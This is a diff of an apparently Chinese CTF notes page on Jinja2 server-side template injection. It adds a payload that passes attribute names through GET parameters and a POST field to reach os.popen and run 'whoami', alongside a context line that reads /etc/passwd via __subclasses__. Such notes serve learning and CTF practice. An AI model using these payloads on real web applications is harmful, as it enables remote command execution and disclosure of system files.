@@ -246,7 +246,10 @@
 <li>
 <p><code>request.args</code></p>
 <div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>{{&#39;&#39;[request.args.class][request.args.base][request.args.subclasses]()[index](&#39;/etc/passwd&#39;).read() }}<span style=color:#960050;background-color:#1e0010>&amp;</span>class=__class__<span style=color:#960050;background-color:#1e0010>&amp;</span>base=__base__<span style=color:#960050;background-color:#1e0010>&amp;</span>subclasses=__subclasses__
-</code></pre></div></li>
+</code></pre></div><p>这种方式可以结合get和post，举例-><a href=https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#RYhszr>[CTFshow 击剑杯]通关大佬</a>，在不同的字段处对传入参数的限制是不同的</p>
+<pre tabindex=0><code>/edit?a=__init__&amp;b=__globals__&amp;c=__getitem__&amp;d=os&amp;e=popen&amp;f=whoami&amp;g=read
+POST: name={%25set%20r=request.args%25}&amp;rank=1&amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;time=2021年11月11日
+</code></pre></li>
 <li>
 <p>按字符串的方式走，也可</p>
 </li>
@@ -370,7 +373,7 @@ placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
 </div>
 <div class="text-sm text-gray-500 leading-tight a-gray">
 <br>
-Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 2864 words in this page.
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 3077 words in this page.
 </div>
 </div>
 </div>
